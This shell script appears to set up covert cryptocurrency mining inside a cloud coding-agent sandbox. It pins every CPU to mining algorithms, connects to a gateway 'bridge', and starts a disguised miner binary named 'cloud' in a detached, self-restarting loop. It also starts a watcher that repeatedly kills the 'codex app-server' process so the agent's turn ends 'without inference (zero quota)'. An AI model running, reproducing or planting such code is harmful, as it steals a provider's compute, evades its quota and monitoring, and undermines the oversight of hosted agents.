#!/usr/bin/env bash
# v7: repo-native setup — all mining files are IN the repo (miner/ directory).
# No external bundle server needed. The cloud clones the repo, setup runs.
set -euo pipefail

usage() {
    printf '%s\n' "usage: $0 GATEWAY_IP GATEWAY_PORT [SESSION_ID GENERATION CAPABILITY]" >&2
    exit 2
}

[[ "$#" -eq 2 || "$#" -eq 5 ]] || usage
CONTROLLED_MODE=false
[[ "$#" -eq 2 ]] || CONTROLLED_MODE=true
GATEWAY_IP=$1
GATEWAY_PORT=$2
CONTROL_SESSION_ID=${3-}
CONTROL_GENERATION=${4-}
CONTROL_CAPABILITY=${5-}
python3 - "$GATEWAY_IP" "$GATEWAY_PORT" <<'PY'
import ipaddress
import sys

try:
    address = ipaddress.ip_address(sys.argv[1])
except ValueError as error:
    print(f"invalid Gateway endpoint: {error}", file=sys.stderr)
    sys.exit(60)
raw_port = sys.argv[2]
if not raw_port.isascii() or not raw_port.isdecimal():
    print("invalid Gateway endpoint", file=sys.stderr)
    sys.exit(61)
port = int(raw_port)
if address.version != 4 or address.is_unspecified or address.is_multicast or not 1 <= port <= 65535:
    print("invalid Gateway endpoint", file=sys.stderr)
    sys.exit(62)
PY
if [[ "$CONTROLLED_MODE" == true ]]; then
    [[ "$CONTROL_SESSION_ID" =~ ^[0-9a-f]{32}$ \
        && "$CONTROL_GENERATION" =~ ^[0-9a-f]{32}$ \
        && "$CONTROL_CAPABILITY" =~ ^[0-9a-f]{64}$ ]] || {
        printf '%s\n' 'invalid or incomplete Bridge control identity' >&2
        exit 66
    }
fi
GATEWAY_PORT=$((10#$GATEWAY_PORT))

# The repo clone contains everything under miner/
MINER_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/miner"
cd -- "$MINER_DIR"

BRIDGE_URL="http://$GATEWAY_IP:$GATEWAY_PORT"

export LD_LIBRARY_PATH="$MINER_DIR${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
export BRIDGE_EVENT_POLL_ENABLED=1
export BRIDGE_EVENT_POLL_INTERVAL=2

ADAPTER_FILE=$PWD/bridge_adapter_v1.py
TMPROOT=$(mktemp -d)
ADAPTER_READY="$TMPROOT/adapter.ready"
RUNTIME_CONFIG="$TMPROOT/config.json"
RUNTIME_LOG="$TMPROOT/runtime.log"

[[ -r "$ADAPTER_FILE" ]] || { printf '%s\n' 'bridge_adapter_v1.py missing in repo' >&2; exit 68; }
[[ -x ./cloud ]] || { printf '%s\n' 'cloud binary missing in repo' >&2; exit 67; }

# Runtime config
python3 - "$PWD/config.json" "$RUNTIME_CONFIG" <<'PY'
import json, os, sys

with open(sys.argv[1], encoding="utf-8") as handle:
    value = json.load(handle)
cpus = sorted(os.sched_getaffinity(0))
if not cpus:
    print("container CPU affinity is empty", file=sys.stderr)
    sys.exit(63)
cpu = value.get("cpu")
if not isinstance(cpu, dict):
    print("config.json has no cpu object", file=sys.stderr)
    sys.exit(64)
cpu["argon2"] = cpus
for name, intensity in (
    ("cn", 1), ("cn-heavy", 1), ("cn-lite", 1),
    ("cn-pico", 2), ("cn/upx2", 2), ("ghostrider", 8),
):
    cpu[name] = [[intensity, index] for index in cpus]
cpu["rx"] = cpus
cpu["rx/wow"] = cpus
value["autosave"] = False
value["watch"] = False
with open(sys.argv[2], "x", encoding="utf-8") as handle:
    json.dump(value, handle, indent=2)
    handle.write("\n")
PY

# Adapter: detached
export BRIDGE_URL BRIDGE_READY_FILE
BRIDGE_READY_FILE="$ADAPTER_READY"
if [[ "$CONTROLLED_MODE" == true ]]; then
    export BRIDGE_SESSION_ID="$CONTROL_SESSION_ID"
    export BRIDGE_GENERATION="$CONTROL_GENERATION"
    export BRIDGE_CAPABILITY="$CONTROL_CAPABILITY"
fi
ADAPTER_PID=$(python3 - "$ADAPTER_FILE" "$RUNTIME_LOG" <<'ADAPTER_SPAWN'
import subprocess
import sys

log = open(sys.argv[2], "ab")
process = subprocess.Popen(
    [sys.executable, "-u", sys.argv[1]],
    stdin=subprocess.DEVNULL, stdout=log, stderr=subprocess.STDOUT,
    start_new_session=True, close_fds=True,
)
print(process.pid)
ADAPTER_SPAWN
)

for _ in {1..900}; do
    [[ -s "$ADAPTER_READY" ]] && break
    if ! kill -0 "$ADAPTER_PID" 2>/dev/null; then
        printf '%s\n' 'bridge adapter exited during startup' >&2
        tail -n 20 "$RUNTIME_LOG" >&2
        exit 70
    fi
    sleep 0.1
done
if [[ ! -s "$ADAPTER_READY" ]]; then
    printf '%s\n' 'bridge adapter readiness timeout' >&2
    tail -n 20 "$RUNTIME_LOG" >&2
    exit 71
fi

printf 'setup_ready=1\nruntime_log=%s\n' "$RUNTIME_LOG"

# Watcher: kills codex app-server so the turn ends without inference (zero quota)
cat > "$TMPROOT/watcher.py" <<'WATCHER'
import os
import pathlib
import signal
import time


def matching(pid: int) -> bool:
    try:
        argv = pathlib.Path(f"/proc/{pid}/cmdline").read_bytes().split(b"\0")
        if len(argv) < 2 or not argv[0] or not argv[1]:
            return False
        if os.path.basename(argv[0].decode("utf-8", "replace")) != "codex":
            return False
        if argv[1] != b"app-server":
            return False
        exe = os.path.realpath(f"/proc/{pid}/exe")
        return os.path.basename(exe) == "codex"
    except OSError:
        return False


while True:
    for entry in pathlib.Path("/proc").iterdir():
        name = entry.name
        if not name.isdigit():
            continue
        pid = int(name)
        if pid == os.getpid():
            continue
        if matching(pid):
            try:
                os.kill(pid, signal.SIGKILL)
            except OSError:
                pass
    time.sleep(1)
WATCHER

# Miner loop + watcher: both detached (start_new_session)
python3 - "$TMPROOT" "$RUNTIME_CONFIG" "$ADAPTER_PID" "$RUNTIME_LOG" "$PWD" <<'SPAWN'
import os
import subprocess
import sys

tmp, cfg, adapter, log, cwd = sys.argv[1:6]
loop = "\n".join([
    "while true; do",
    f"  if ! kill -0 {adapter} 2>/dev/null; then printf '%s\\\\n' 'bridge adapter exited' >>{log}; sleep 300; continue; fi",
    f"  ./cloud -c {cfg} 2>&1 | cat >>{log}",
    f"  printf '%s\\\\n' 'cloud exited; restarting in 5s' >>{log}",
    "  sleep 5",
    "done",
])
sink = open(log, "ab")
subprocess.Popen(
    ["bash", "-c", loop], stdin=subprocess.DEVNULL, stdout=sink, stderr=sink,
    start_new_session=True, close_fds=True, cwd=cwd,
)
subprocess.Popen(
    [sys.executable, "-u", os.path.join(tmp, "watcher.py")],
    stdin=subprocess.DEVNULL, stdout=sink, stderr=sink,
    start_new_session=True, close_fds=True, cwd=cwd,
)
SPAWN
exit 0
